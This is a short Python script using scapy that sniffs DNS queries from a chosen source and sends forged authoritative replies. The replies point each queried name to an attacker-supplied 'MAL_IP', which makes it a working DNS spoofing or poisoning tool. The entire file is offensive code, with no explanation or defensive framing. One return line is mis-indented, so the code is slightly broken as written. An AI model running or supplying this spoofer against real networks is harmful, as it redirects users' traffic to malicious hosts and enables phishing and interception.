from scapy.all import *
import sys
interface = sys.argv[1]
dns_server = sys.argv[2]
hostnameip = sys.argv[3]



def DNS_Responder(REC_IP, MAL_IP):

    def getResponse(pkt):
    # check dns query
        if (DNS in pkt and pkt[DNS].opcode==0L and pkt[IP].src==REC_IP):
            print(pkt.show())

            spfResp=IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport,sport=pkt[UDP].dport)/DNS(id=pkt[DNS].id,qr=1L,aa=1L,qd=pkt[DNS].qd,qdcount=1,rd=1,ancount=1,nscount=0,arcount=0, an=(DNSRR(rrname=pkt[DNS].qd.qname,type='A',ttl=3600,rdata=MAL_IP)))

            send(spfResp,verbose=1)

             return "Spoofed DNS Response Sent " + pkt['DNS Question Record'].qname



        else:
            #print(pkt.show())
            return "I'm sniffing haha"

    return getResponse



sniff(prn=DNS_Responder(dns_server, hostnameip))
